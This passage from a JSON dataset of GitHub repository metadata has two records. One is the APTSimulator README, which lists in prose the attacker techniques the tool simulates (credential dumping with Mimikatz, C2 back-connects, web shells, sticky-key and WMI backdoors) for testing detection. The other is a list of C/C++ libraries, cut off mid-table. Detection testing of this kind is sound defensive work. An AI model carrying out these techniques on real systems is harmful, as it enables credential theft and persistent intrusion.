|\\n\\n# Test Sets\\n\\n## Collection\\n\\n### Collect Local Files\\n\\n- drops pwdump output to the working dir\\n- drops directory listing to the working dir\\n\\n## Command and Control\\n\\n### C2 Connects\\n\\n- Uses Curl to access well-known C2 servers\\n\\n### DNS Cache 1\\n\\n- Looks up several well-known C2 addresses to cause DNS requests and get the addresses into the local DNS cache\\n\\n### Malicious User Agents\\n\\n- Uses malicious user agents to access web sites\\n\\n### Ncat Back Connect\\n\\n- Drops a PowerShell Ncat alternative to the working directory and runs it to back connect to a well-known attacker domain\\n\\n### WMI Backdoor C2\\n\\n- Using Matt Graeber's WMIBackdoor to contact a C2 in certain intervals\\n\\n## Credential Access\\n\\n### LSASS DUMP\\n\\n- Dumps LSASS process memory to a suspicious folder\\n\\n### Mimikatz-1\\n\\n- Dumps mimikatz output to working directory (fallback if other executions fail)\\n- Run special version of mimikatz and dump output to working directory\\n- Run Invoke-Mimikatz in memory (github download, reflection)\\n\\n### WCE-1\\n\\n- Creates Windwows Eventlog entries that look as if WCE had been executed\\n\\n## Defense Evasion\\n\\n### Active Guest Account Admin\\n\\n- Activates Guest user\\n- Adds Guest user to the local administrators\\n\\n### Fake System File\\n\\n- Drops suspicious executable with system file name (svchost.exe) in %PUBLIC% folder\\n- Runs that suspicious program in %PUBLIC% folder\\n\\n### Hosts\\n\\n- Adds entries to the local hosts file (update blocker, entries caused by malware)\\n\\n### JS Dropper\\n\\n- Runs obfuscated JavaScript code with wscript.exe and starts decoded bind shell on port 1234/tcp\\n\\n### Obfuscation\\n\\n- Drops a cloaked RAR file with JPG extension\\n\\n## Discovery\\n\\n### Nbtscan Discovery\\n\\n- Scanning 3 private IP address class-C subnets and dumping the output to the working directory\\n\\n### Recon\\n\\n- Executes command used by attackers to get information about a target system\\n\\n## Execution\\n\\n### PsExec\\n\\n- Dump a renamed version of PsExec to the working directory\\n- Run PsExec to start a command line in LOCAL_SYSTEM context\\n\\n### Remote Execution Tool\\n\\n- Drops a remote execution tool to the working directory\\n\\n## Lateral Movement\\n\\nNo test cases yet\\n\\n## Persistence\\n\\n### At Job\\n\\n- Creates an at job that runs mimikatz and dumps credentials to file\\n\\n### RUN Key\\n\\n- Create a suspicious new RUN key entry that dumps \\\"net user\\\" output to a file\\n\\n### Scheduled Task\\n\\n- Creates a scheduled task that runs mimikatz and dumps the output to a file\\n\\n### Scheduled Task XML\\n\\n- Creates a scheduled task via XML file using Invoke-SchtasksBackdoor.ps1\\n\\n### Sticky Key Backdoor\\n\\n- Tries to replace sethc.exe with cmd.exe (a backup file is created)\\n- Tries to register cmd.exe as debugger for sethc.exe\\n\\n### Web Shells\\n\\n- Creates a standard web root directory\\n- Drops standard web shells to that diretory\\n- Drops GIF obfuscated web shell to that diretory\\n\\n### UserInitMprLogonScript Persistence\\n\\n- Using the UserInitMprLogonScript key to get persistence\\n\\n### WMI Backdoor\\n\\n- Using Matt Graeber's [WMIBackdoor](https://github.com/mattifestation/WMI_Backdoor/) to kill local procexp64.exe when it starts\\n\\n# Batch Mode\\n\\nSince version 0.8.0 APTSimulator features a batch mode provided by @juju4 that allows to run it in in a scripted way e.g. via [Ansible](https://github.com/juju4/ansible-win-aptsimulator) \\n\\n```\\nAPTSimulator.bat -b\\n```\\n\\n# Warning\\n\\nThis repo contains tools and executables that can harm your system's integrity and stability. Do only use them on non-productive test or demo systems.\\n\\n# Screenshots\\n\\n![Screen](/screenshots/apt-0.png)\\n![Screen](/screenshots/apt-1.png)\\n![Screen](/screenshots/apt-2.png)\\n![Screen](/screenshots/apt-c2.png)\\n\\n# Advanced Solutions\\n\\nThe CALDERA automated adversary emulation system\\n[https://github.com/mitre/caldera](https://github.com/mitre/caldera)\\n\\nInfection Monkey - An automated pentest tool\\n[https://github.com/guardicore/monkey](https://github.com/guardicore/monkey)\\n\\nFlightsim - A utility to generate malicious network traffic and evaluate controls \\n[https://github.com/alphasoc/flightsim](https://github.com/alphasoc/flightsim)\\n\\n# Integrated Projects / Software\\n\\n- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\\n- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)\\n- [PowerCat](https://github.com/besimorhino/powercat)\\n- [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)\\n- [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)\\n- [7Zip](http://www.7-zip.org/download.html)\\n- [curl](https://curl.haxx.se/)\\n\\n# Contact\\n\\nFollow and contact me on Twitter @cyb3rops\\n\"", "topics": ["apt", "simulator"], "writeup": "APT Simulator is a Windows Batch script that uses a set of tools and output files to make a system look as if it was compromised. In contrast to other adversary simulation tools, APT Simulator is designed to make the application as simple as possible. You don't need to run a web server, database or any agents on set of virtual machines. Just download the prepared archive, extract and run the contained Batch file as Administrator.\n", "ignoredescription": false, "id": 67, "full_name": "NextronSystems/APTSimulator", "url": "https://github.com/NextronSystems/APTSimulator", "topic_string": "apt simulator"},
{"tags": [], "owner": "nothings", "description": "List of single-file C/C++ libraries.", "name": "single_file_libs", "topics_string": "", "language": "c++", "readme": "\"# Single-file public-domain/open source libraries with minimal dependencies\\n\\nI am the author of a large number of [single-file C/C++ public domain libraries](https://github.com/nothings/stb).\\nI am not the only person who writes libraries like this, so below are other, similar libraries.\\n\\nGenerally, the following is a list of small, easy-to-integrate, portable libraries\\nwhich are usable from C and/or C++, and should be able to be compiled on both\\n32-bit and 64-bit platforms. However, I have not personally verified that any\\nspecific lilbrary is as advertised, or is quality software.\\n\\n### Rules\\n\\n- Libraries must be usable from C or C++, ideally both\\n- Libraries should be usable from more than one platform (ideally, all major desktops and/or all major mobile)\\n- Libraries should compile and work on both 32-bit and 64-bit platforms\\n- Libraries should use at most two files (one header, one source)\\n\\nExceptions will be allowed for good reasons.\\n\\n### Recent additions\\n\\nRecent additions are marked with an asterisk in the left column.\\n\\n### New libraries and corrections\\n\\nSee discussion after the list.\\n\\n### JSON Parsing\\n\\nThere are a lot of JSON parsers listed here. For some analysis and performance\\nresults, check out https://github.com/miloyip/nativejson-benchmark\\n\\n### Other lists\\n\\nAlso you might be interested in other related, but different lists:\\n\\n- [clib](https://github.com/clibs/clib/wiki/Packages): list of (mostly) small single C functions (licenses not listed)\\n- [CCAN](https://ccodearchive.net/list.html): package of lots of shareable C functions (mixed licenses)\\n\\n### Library listing\\n\\n**Public domain single-file libraries usable from C and C++ are in bold.** Other\\nlibraries are either non-public domain, or two files, or not usable from both C and C++, or\\nall three. Libraries of more than two files are mostly forbidden.\\n\\nFor the API column, \\\"C\\\" means C only, \\\"C++\\\" means C++ only, and \\\"C/C++\\\" means C/C++ usable\\nfrom either; some files may require *building* as C or C++ but still qualify as \\\"C/C++\\\" as\\nlong as the header file uses `extern \\\"C\\\"` to make it work. (In some cases, a header-file-only\\nlibrary may compile as both C or C++, but produce an implementation that can only be called from\\none or the other, because of a lack of use of `extern \\\"C\\\"`; in this case the table still qualifies it\\nas C/C++, as this is not an obstacle to most users.)\\n\\n### Categories:\\n\\n - general purpose\\n - [data structures](#data-structures)\\n - [string processing](#strings)\\n - [scripting](#scripting)\\n - [hashing](#hashing)\\n - mathematics\\n - [vector math](#vectors)\\n - [geometry math](#geometry-math)\\n - [general math](#math)\\n - parsing\\n - [JSON](#json)\\n - [YAML](#yaml)\\n - [CSV](#csv)\\n - [other serialization](#serialization)\\n - [argv argument processing](#argv)\\n - [other parsing](#parsing)\\n - graphics\\n - [textmode](#graphics-text)\\n - [2D graphics](#graphics-2d)\\n - [3D graphics](#graphics-3d)\\n - [3D geometry file processing](#geometry-file)\\n - [image loading, saving, & processing](#images)\\n - audio/video/data compression\\n - [compression](#compression)\\n - [audio processing & files](#audio)\\n - [video](#video)\\n - [videogames](#videogames)\\n - operating system features\\n - [files and filenames](#files--filenames)\\n - [multithreading](#multithreading)\\n - [networking](#network)\\n - [hardware interfacing](#hardware)\\n - debugging, profiling, testing\\n - [debugging](#debugging)\\n - [profiling](#profiling)\\n - [unit testing etc.](#unit-testing)\\n - other\\n - [AI](#ai)\\n - [cryptography](#crypto)\\n - [user interface](#user-interface)\\n - [miscellaneous](#miscellaneous)\\n\\n# AI\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [Genann](https://github.com/codeplea/genann) | zlib |C/C++| 2 | simple neural networks (ANN)\\n| [KANN](https://github.com/attractivechaos/kann) | MIT |C/C++| 2 | automatic differentiation (2 files)\\n| [micropather](http://www.grinninglizard.com/MicroPather/) | zlib | C++ | 2 | pathfinding with A\\\\*\\n\\n# argv\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [Argh!](https://github.com/adishavit/argh) | BSD | C++ |**1**| command-line argument parsing\\n| [Clara](https://github.com/catchorg/Clara) | Boost | C++ |**1**| composable, command line parser for C++ 11 and beyond\\n| [CLI11](https://github.com/CLIUtils/CLI11) | BSD | C++ |**1**| Feature-rich CLI parsing in modern C++11 \\n| [cmdline](https://github.com/tanakh/cmdline) | BSD | C++ |**1**| command-line argument parsing\\n| [flags](https://github.com/sailormoon/flags) | **public domain** | C++ |**1**| command-line argument parsing\\n| [kgflags](https://github.com/kgabis/kgflags) | MIT |C/C++|**1**| command-line argument parsing\\n| [linkom](https://github.com/hernandp/linkom) | MIT |C/C++|**1**| command-line argument parsing w/ DOS-style options\\n| [optionparser](http://optionparser.sourceforge.net/) | MIT | C++ |**1**| command-line argument parsing\\n| [parg](https://github.com/jibsen/parg) | **public domain** | C | 2 | command-line argument parsing\\n| [ProgramOptions.hxx](https://github.com/Fytch/ProgramOptions.hxx) | MIT | C++ |**1**| command-line argument parsing\\n\\n# audio\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [aw_ima.h](https://github.com/afterwise/aw-ima/blob/master/aw-ima.h) | MIT |C/C++|**1**| IMA-ADPCM audio decoder\\n| [btac1c](https://github.com/cr88192/bgbtech_misc/blob/master/mini/btac1c_mini0.h)| MIT |C/C++|**1**| MS-IMA_ADPCM variant\\n|**[dr_flac](https://github.com/mackron/dr_libs)** | **public domain** |C/C++|**1**| FLAC audio decoder\\n|**[dr_wav](https://github.com/mackron/dr_libs)** | **public domain** |C/C++|**1**| WAV audio loader\\n| [Geneva](https://github.com/KrzysztofSzewczyk/Geneva) | MIT |C/C++|**1**| Library generating 8-bit waveforms of various kinds\\n| [minimp3](https://github.com/lieff/minimp3) | CC0 | C |**1**| Minimalistic MP3 decoder with sse/neon support\\n|**[miniaudio](https://github.com/dr-soft/miniaudio)** | **public domain** |C/C++|**1**| Audio playback and capture library\\n| [pocketmod](https://github.com/rombankzero/pocketmod) | MIT |C/C++|**1**| ProTracker MOD file renderer\\n|**[sts_mixer](https://github.com/kieselsteini/sts)** | **public domain** |C/C++|**1**| simple stereo audio mixer\\n| [tinysound](https://github.com/RandyGaul/tinyheaders) | zlib |C/C++|**1**| direct sound audio mixer & WAV loader\\n| [TinySoundFont](https://github.com/schellingb/TinySoundFont) | MIT |C/C++|**1**| SoundFont2 loader & synthesizer\\n\\n# compression\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [dmc_unrar](https://github.com/DrMcCoy/dmc_unrar) | GPLv2+ |C/C++|**1**| RAR file decompression\\n| [fastlz](https://code.google.com/archive/p/fastlz/source/default/source) | MIT |C/C++| 2 | fast but larger LZ compression\\n| [lz4](https://github.com/lz4/lz4) | BSD |C/C++| 2 | fast but larger LZ compression\\n|**[miniz.c](https://github.com/richgel999/miniz)** | MIT |C/C++|**1**| compression, decompression, ZIP file, PNG writing\\n| [microtar](https://github.com/rxi/microtar) | MIT |C/C++| 2 | lightweight tar library\\n| [pithy](https://github.com/johnezang/pithy) | BSD |C/C++| 2 | fast but larger LZ compression\\n\\n# crypto\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [Monocypher](https://monocypher.org) | **public domain** | C | 2 | high-quality small cryptography library\\n| [TweetNaCl](http://tweetnacl.cr.yp.to/software.html) | **public domain** | C | 2 | high-quality tiny cryptography library\\n\\n# data structures\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [avl](https://github.com/etherealvisage/avl) | **public domain** |C/C++| 2 | AVL tree\\n| [c-bool-value](https://github.com/lduck11007/c-bool-value) | **WTFPLv2** |C/C++| 1 | Simple and easy boolean values in standard c\\n| [chobo-shl](https://github.com/Chobolabs/chobo-shl) | MIT | C++ |**1**| several C++11 standard contaner like libraries and helpers\\n|**[DG_dynarr.h](https://github.com/DanielGibson/Snippets/)** | **public domain** |C/C++|**1**| typesafe dynamic arrays (like std::vector) for plain C\\n| [DynaVar](https://github.com/ArjArav98/DynaVar) | GPL-3.0 | C++ | 1 | Object which can store any type of primitive data type\\n| [klib](http://attractivechaos.github.io/klib/) | MIT |C/C++| 2 | many 2-file libs: hash, sort, b-tree, etc\\n| [libpqueue](https://github.com/vy/libpqueue) | BSD |C/C++| 2 | priority queue (heap)\\n| [minilibs](https://github.com/ccxvii/minilibs) | **public domain** | C | 2 | two-file binary tress (also regex, etc)\\n| [PackedArray](https://github.com/gpakosz/PackedArray) | **WTFPLv2** | C | 2 | memory-efficient array of elements with non-pow2 bitcount\\n| [simclist](http://mij.oltrelinux.com/devel/simclist) | BSD |C/C++| 2 | linked-list\\n| [selist](https://github.com/ennorehling/clibs) | ISC |C/C++| 2 | space-efficient linked-list\\n| [mempool](https://github.com/hardikp/cpp-mempool) | MIT | C++ |**1**| Efficient minimal memory pool implementation for C++\\n| [uthash](https://github.com/troydhanson/uthash) | BSD |C/C++| 2 | several 1-header, 1-license-file libs: generic hash, list, etc\\n\\n# debugging\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [dbgtools](https://github.com/wc-duck/dbgtools) | zlib |C/C++| 2 | cross-platform debug util libraries\\n| [debug-assert](https://github.com/foonathan/debug_assert) | zlib | C++ |**1**| modular assertion macro\\n| [debugbreak](https://github.com/scottt/debugbreak) | BSD |C/C++|**1**| programmatic debug break\\n| [loguru](https://github.com/emilk/loguru) | **public domain** | C++ |**1**| flexible logging\\n| [pempek_assert.cpp](https://github.com/gpakosz/Assert) | **WTFPLv2** | C++ | 2 | flexible assertions\\n\\n# files & filenames\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n|**[DG_misc.h](https://github.com/DanielGibson/Snippets/)** | **public domain** |C/C++|**1**| Daniel Gibson's stb.h-esque cross-platform helpers: path/file, strings\\n| [dirent](https://github.com/tronkko/dirent) | MIT |C/C++|**1**| dirent for Windows: retrieve file & dir info\\n| [tfile](https://github.com/rec/tfile) | MIT |C++|**1**| FILE* wrapper does read-write-append-seek-close (Win/Mac/Unix)\\n| [TinyDir](https://github.com/cxong/tinydir) | BSD | C |**1**| cross-platform directory reading (Win/POSIX/MinGW)\\n| [tinyfiles](https://github.com/RandyGaul/tinyheaders) | zlib |C/C++|**1**| cross-platform directory reading (Win/Mac/Unix)\\n| [whereami](https://github.com/gpakosz/whereami) | **WTFPLv2** |C/C++| 2 | get path/filename of executable or module\\n\\n# geometry file\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [cgltf](https://github.com/jkuhlmann/cgltf) | MIT | C |**1**| glTF 2.0 file loader\\n| [fast_obj.h](https://github.com/thisistherk/fast_obj) | MIT | C |**1**| wavefront OBJ file loader\\n| [objzero](https://github.com/jpcy/objzero) | MIT | C | 2 | wavefront OBJ file loader\\n| [tinyply](https://github.com/ddiakopoulos/tinyply) | **public domain** | C++ | 2 | PLY mesh file loader\\n| [tinyobjloader](https://github.com/syoyo/tinyobjloader) | MIT | C++ |**1**| wavefront OBJ file loader\\n| [tinyobjloader-c](https://github.com/syoyo/tinyobjloader-c) | MIT | C |**1**| wavefront OBJ file loader\\n| [tk_objfile](https://github.com/joeld42/tk_objfile) | MIT |C/C++|**1**| OBJ file loader\\n| [yocto_obj.h](https://github.com/xelatihy/yocto-gl) | MIT |C/C++|**1**| wavefront OBJ file loader\\n\\n# geometry math\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [Clipper](http://www.angusj.com/delphi/clipper.php) | Boost | C++ | 2 | line & polygon clipping & offsetting\\n|**[df](https://github.com/983/df)** | **public domain** |C/C++|**1**| find voronoi region in linear time of size of lattice\\n| [jc_voronoi](https://github.com/JCash/voronoi) | MIT |C/C++|**1**| find voronoi regions on float/double data\\n| [nanoflann](https://github.com/jlblancoc/nanoflann) | BSD | C++ |**1**| build KD trees for point clouds\\n|**[nv_voronoi.h](http://www.icculus.org/~mordred/nvlib/)** | **public domain** |C/C++|**1**| find voronoi regions on lattice w/ integer inputs\\n| [par_msquares](https://github.com/prideout/par) | MIT |C/C++|**1**| convert (binarized) image to triangles\\n| [par_shapes](http://github.prideout.net/shapes) | MIT |C/C++|**1**| generate various 3d geometric shapes\\n| [PolyPartition](https://github.com/ivanfratric/polypartition) | MIT | C++ | 2 | polygon triangulation, partitioning\\n|**[rjm_mc.h](https://github.com/rmitton/rjm)** | **public domain** |C/C++|**1**| marching cubes triangulator\\n|**[sobol.h](https://github.com/Marc-B-Reynolds/Stand-alone-junk/)** | **public domain** |C/C++|**1**| sobol & stratified sampling sequences\\n| [sdf.h](https://github.com/memononen/SDF) | MIT |C/C++|**1**| compute signed-distance field from antialiased image\\n| [Tomas Akenine-Moller snippets](http://tinyurl.com/ht79ndj) | **public domain** |C/C++| 2 | various 3D intersection calculations, not lib-ified\\n| [Voxelizer](https://github.com/karimnaaji/voxelizer) | MIT |C/C++|**1**| convert triangle mesh to voxel triangle mesh\\n| [xatlas](https://github.com/jpcy/xatlas) | MIT | C++ | 2 | mesh parameterization\\n| [yocto_bvh.h](https://github.com/xelatihy/yocto-gl) | MIT |C/C++|**1**| ray-casting and closest-element queries of bounding-volume hierarchy\\n| [yocto_shape.h](https://github.com/xelatihy/yocto-gl) | MIT |C/C++|**1**| shape generation, tesselation, normals, etc.\\n\\n# graphics (text)\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [rang](https://github.com/agauniyal/rang) | **public domain** | C++ |**1**| cross-platform colored console text\\n\\n# graphics (2d)\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [blendish](https://bitbucket.org/duangle/oui-blendish/src) | MIT |C/C++| 1 | blender-style widget rendering using NanoVG\\n| [Cimg](http://cimg.eu/) | CeCILL/CeCILL-C | C++ |**1**| image processing toolkit (60K LoC)\\n| [Immediate2D](https://github.com/npiegdon/immediate2d) | **public domain** | C++ | 2 | zero-configuration, immediate-mode 2D graphics for Windows\\n| [noc_turtle](https://github.com/guillaumechereau/noc) | MIT |C/C++| 2 | procedural graphics generator\\n| [tigr](https://bitbucket.org/rmitton/tigr/src) | **public domain** |C/C++| 2 | quick-n-dirty window text/graphics for Windows and macOS\\n\\n# graphics (3d)\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [debug-draw](https://github.com/glampert/debug-draw) | **public domain** | C++ |**1**| API-agnostic immediate-mode debug rendering\\n|**[lightmapper](https://github.com/ands/lightmapper#lightmapper)** | **public domain** |C/C++|**1**| use your OpenGL renderer to offline bake lightmaps\\n| [mikktspace](https://developer.blender.org/diffusion/B/browse/master/intern/mikktspace)| zlib|C/C++| 2 | compute tangent space for normal mapping\\n| [rjm_raytrace.h](https://github.com/rmitton/rjm) | **public domain** |C/C++|**1**| minimalistic SSE packet raytracer for offline baking\\n|**[seamoptimizer](https://github.com/ands/seamoptimizer)** | **public domain** |C/C++|**1**| modify lightmap data to hide seams\\n| [sokol_gfx.h](https://github.com/floooh/sokol) | MIT |C/C++|**1**| cross-platform 3D API wrapper (GLES2+3/GL3/D3D11/Metal)\\n| [Swarmz](https://github.com/Cultrarius/Swarmz) | **public domain** | C++ |**1**| swarming/flocking algorithm\\n| [tinygizmo](https://github.com/ddiakopoulos/tinygizmo) | **public domain** | C++ | 2 | gizmo objects for interactively editing 3d transformations\\n|**[Vertex Cache Optimizer](https://github.com/Sigkill79/sts)** | **public domain** |C/C++|**1**| vertex cache optimization of meshes\\n| [Vulkan Memory Allocator](https://github.com/GPUOpen-LibrariesAndSDKs/VulkanMemoryAllocator)|MIT|C/C++|**1**| memory allocator for Vulkan\\n| [yocto_trace.h](https://github.com/xelatihy/yocto-gl) | MIT |C/C++|**1**| physically-based unidirectional path tracer w/ MIS for direct lights\\n| [yocto_symrigid.h](https://github.com/xelatihy/yocto-gl) | MIT |C/C++|**1**| rigid body simulator (sequential impulse/PGS) with support for concave objects\\n\\n# hardware\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n|**[EasyTab](https://github.com/ApoorvaJ/EasyTab)** | **public domain** |C/C++|**1**| multi-platform tablet input\\n| [libue](https://github.com/houqp/libue) | MIT |C/C++| 1 | Helper library for Linux device hot-plug event\\n\\n# hashing\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [xxHash](https://github.com/Cyan4973/xxHash) | BSD |C/C++| 2 | fast hash function\\n\\n# images\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| EXR [miniexr](https://github.com/aras-p/miniexr) | **public domain** | C++ | 2 | OpenEXR writer, needs header file\\n| EXR [tinyexr](https://github.com/syoyo/tinyexr) | BSD |C/C++|**1**| EXR image read/write, uses miniz internally\\n| GIF [gif.h](https://github.com/ginsweater/gif-h) | **public domain** | C++ |**1**| animated GIF writer (can only include once)\\n| GIF **[gif_load](https://github.com/hidefromkgb/gif_load)** | **public domain** |C/C++|**1**| (animated) GIF reader\\n| GIF [jo_gif.cpp](http://www.jonolick.com/home/gif-writer) | **public domain** | C++ |**1**| animated GIF writer (CPP file can also be used as H file)\\n| JPG [jpeg-compressor](https://github.com/richgel999/jpeg-compressor) | **public domain** | C++ | 2 | 2-file JPEG compress, 2-file JPEG decompress\\n| JPG [NanoJPEG](http://keyj.emphy.de/nanojpeg/) | MIT |C/C++|**1**| JPEG decoder\\n| JPG **[tiny_jpeg.h](https://github.com/serge-rgb/TinyJPEG/)** | **public domain** |C/C++|**1**| JPEG encoder\\n| JPG EXIF [easyexif](https://github.com/mayanklahiri/easyexif) | MIT | C++ | 2 | EXIF metadata extractor for JPEG images\\n| JPG EXIF [TinyEXIF](https://github.com/cdcseacave/TinyEXIF) | BSD | C++ | 2 | Parse EXIF data from JPEG (XMP w/ TinyXML2 lib)\\n| PDF [PDFgen](https://github.com/AndreRenaud/PDFGen) | **public domain** | C | 2 | PDF writer |\\n| PNG [lodepng](http://lodev.org/lodepng/) | zlib |C/C++| 2 | PNG encoder/decoder\\n| PNG [picopng.cpp](http://lodev.org/lodepng/picopng.cpp) | zlib | C++ | 2 | tiny PNG loader\\n| PNG [TinyPngOutput](https://www.nayuki.io/page/tiny-png-output) | LGPLv3 |C/C++| 2 | PNG writer |\\n| PNM [PNM](https://github.com/dmilos/PNM) | Apache 2.0 | C++ | 1 | PBM, PGM and PPM reader and writer |\\n| SVG [nanoSVG](https://github.com/memononen/nanosvg) | zlib |C/C++|**1**| 1-file SVG parser; 1-file SVG rasterizer\\n|**[cro_mipmap.h](https://github.com/thebeast33/cro_lib)** | **public domain** |C/C++|**1**| average, min, max mipmap generators\\n| [rjm_texbleed.h](https://github.com/rmitton/rjm) | **public domain** |C/C++|**1**| Fills in the color of pixels where alpha==0 \\n\\n# math\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [amoeba](https://github.com/starwing/amoeba) | MIT |C/C++|**1**| constraint solver (Cassowary) w/Lua binding\\n| [fft](https://github.com/wareya/fft) | **public domain** | C++ |**1**| Fast Fourier Transform |\\n| [PoissonGenerator.h](https://github.com/corporateshark/poisson-disk-generator) | MIT | C++ |**1**| Poisson disk points generator (disk or rect)\\n| [prns.h](http://marc-b-reynolds.github.io/shf/2016/04/19/prns.html) | **public domain** |C/C++|**1**| seekable pseudo-random number sequences\\n|**[rnd.h](https://github.com/mattiasgustavsson/libs)** | **public domain** |C/C++|**1**| pseudo-random number generation\\n| [ShaderFastLibs](https://github.com/michaldrobot/ShaderFastLibs) | MIT | C++ |**1**| (also HLSL) approximate transcendental functions optimized for shaders (esp. GCN)\\n| [simrank.hpp](https://github.com/roukaour/simrank) | MIT | C++ | 2 | SimRank graph similarity algorithm\\n| [SummedAreaTable](https://github.com/corporateshark/Summed-Area-Table.git) | MIT | C++ |**1**| Summed-Area Table generation and sum/avg queries\\n| [TinyExpr](https://github.com/codeplea/tinyexpr) | zlib | C | 2 | evaluation of math expressions from strings\\n\\n# multithreading\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [bikeshed.h](https://github.com/DanEngelbrecht/bikeshed) | MIT |C/C++|**1**| cross-platform lock free fixed memory hierarchical work scheduler \\n| [mm_sched.h](https://github.com/vurtun/mmx) | zlib |C/C++|**1**| cross-platform multithreaded task scheduler based on [enkiTS](https://github.com/dougbinks/enkiTS)\\n|**[thread.h](https://github.com/mattiasgustavsson/libs)** | **public domain** |C/C++|**1**| cross-platform thread primitives\\n| [TinyCThread](https://tinycthread.github.io/) | zlib |C/C++| 2 | cross-platform implementation of the C11 Threads API\\n| [TinyThread++](https://tinythreadpp.bitsnbites.eu/) | zlib | C++ | 2 | cross-platform implementation of the C++11 Threads API\\n\\n# network\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [civetweb](https://github.com/civetweb/civetweb) | MIT |C/C++| 2 | HTTP server, fork of Mongoose\\n| [EWS](https://github.com/hellerf/EmbeddableWebServer) | BSD |C/C++|**1**| HTTP server\\n| [happyhttp](https://github.com/Zintinio/HappyHTTP) | zlib | C++ | 2 | HTTP client requests\\n|**[http](https://github.com/mattiasgustavsson/libs)** | **public domain** |C/C++|**1**| HTTP get/post\\n| [libcluon](https://github.com/chrberger/libcluon) | MPL-2.0 | C++ |**1**| cross-platform socket wrapper and data marshalling with native implementations for [Protobuf](https://developers.google.com/protocol-buffers/), [LCM](http://lcm-proj.github.io/type_specification.html)/[ZCM](http://zerocm.github.io/zcm/), JSON, and [MsgPack](https://msgpack.org) serialization/deserialization\\n| [LUrlParser](https://github.com/corporateshark/LUrlParser) | MIT | C++ | 2 | lightweight URL & URI parser RFC 1738, RFC 3986\\n| [mm_web.h](https://github.com/vurtun/mmx) | BSD |C/C++|**1**| lightweight webserver, fork of webby\\n| [mongoose](https://github.com/cesanta/mongoose) | GPLv2 |C/C++| 2 | HTTP server\\n| [par_easycurl.h](https://github.com/prideout/par) | MIT |C/C++|**1**| cURL wrapper\\n|**[sts_net](https://github.com/kieselsteini/sts)** | **public domain** |C/C++|**1**| cross-platform socket wrapper (socket sets and packet API)\\n| [yocto](https://github.com/tom-seddon/yhs) | **public domain** |C/C++| 2 | non-production-use HTTP server\\n|**[zed_net](https://github.com/Smilex/zed_net)** | **public domain** |C/C++|**1**| cross-platform socket wrapper\\n| [znet](https://github.com/starwing/znet) | MIT |C/C++|**1**| cross-platform networking w/ Lua binding\\n\\n# serialization\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [archive](https://github.com/voidah/archive) |**public domain** | C++ |**1**| binary serialize & deserlize w/ STL support\\n| [libcluon](https://github.com/chrberger/libcluon) | MPL-2.0 | C++ |**1**| cross-platform data serialization/deserialization with native implementations for [Protobuf](https://developers.google.com/protocol-buffers/), [LCM](http://lcm-proj.github.io/type_specification.html)/[ZCM](http://zerocm.github.io/zcm/), JSON, and [MsgPack](https://msgpack.org)\\n\\n# json\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [ajson](https://github.com/lordoffox/ajson) | Boost | C++ |**1**| JSON serialize & deserialize w/ STL support\\n| [cJSON](https://sourceforge.net/projects/cjson/) | MIT |C/C++|**1**| JSON parser\\n| [json.h](https://github.com/sheredom/json.h) | **public domain** |C/C++| 2 | JSON parser\\n| [json.hpp](https://github.com/nlohmann/json) | MIT | C++ |**1**| JSON parse, serialize, deserialize\\n| [jzon.h](https://github.com/Zguy/Jzon) | MIT | C++ | 2 | JSON parser\\n| [PicoJSON](https://github.com/kazuho/picojson) | BSD | C++ |**1**| JSON parse/serializer\\n| [parson](https://github.com/kgabis/parson) | MIT |C/C++| 2 | JSON parser and serializer\\n\\n# yaml\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [mini-yaml](https://github.com/jimmiebergmann/mini-yaml) | MIT | C++ | 2 | YAML parser and serializer\\n\\n# csv\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| -----------\\n| [CSVstream](https://github.com/awdeorio/csvstream/) | MIT | C++ |**1**| CSV parser\\n| [Fast C++ CSV Parser](https://github.com/ben-strasser/fast-cpp-csv-parser) | BSD | C++ |**1**| CSV parser\\n| [Rapidcsv](https://github.com/d99kris/rapidcsv/) | BSD | C++ |**1**| CSV parser\\n| [Vince's CSV Parser](https://github.com/vincentlaucsb/csv-parser) | MIT | C++ |**1**| CSV parser and serializer\\n\\n# parsing\\n| library | license | API |files| description\\n| --------------------------------------------------------------------- |:--------------------:|:---:|:---:| 